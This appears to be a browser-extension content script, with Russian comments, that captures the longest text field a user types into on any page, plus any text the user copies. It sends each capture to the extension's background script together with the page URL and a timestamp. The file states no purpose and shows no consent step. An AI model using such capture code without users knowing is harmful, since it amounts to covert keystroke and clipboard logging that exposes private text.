// cs/main.js — собирает ввод текста и копирования
const send = (msg) => browser.runtime.sendMessage(msg).catch(() => {});
const debounce = (fn, t = 300) => { let id; return (...a) => { clearTimeout(id); id = setTimeout(() => fn(...a), t); }; };

function captureTextState() {
  // Берём самое «содержательное» поле (textarea / text inputs)
  const nodes = [...document.querySelectorAll('textarea, input[type="text"], input:not([type])')]
    .filter(el => el && typeof el.value === 'string' && el.value.length >= 3);

  if (!nodes.length) return null;
  const el = nodes.sort((a, b) => b.value.length - a.value.length)[0];
  return { val: el.value.slice(0, 5000), url: location.href, ts: Date.now() };
}

const pushText = debounce(() => {
  const s = captureTextState();
  if (s) send({ type: "text-input", ...s });
}, 300);

// События ввода
document.addEventListener('input', pushText, true);
document.addEventListener('change', pushText, true);

// Перед выгрузкой фиксируем последнее состояние
window.addEventListener('beforeunload', () => {
  const s = captureTextState();
  if (s) send({ type: "text-input", ...s });
}, true);

// История буфера
document.addEventListener('copy', (e) => {
  let txt = '';
  try {
    txt = document.getSelection()?.toString() || '';
    if (!txt && e.clipboardData) {
      txt = e.clipboardData.getData('text/plain') || '';
    }
  } catch (err) {}
  if (txt) send({ type: "clipboard", val: txt.slice(0, 5000), url: location.href, ts: Date.now() });
}, true);
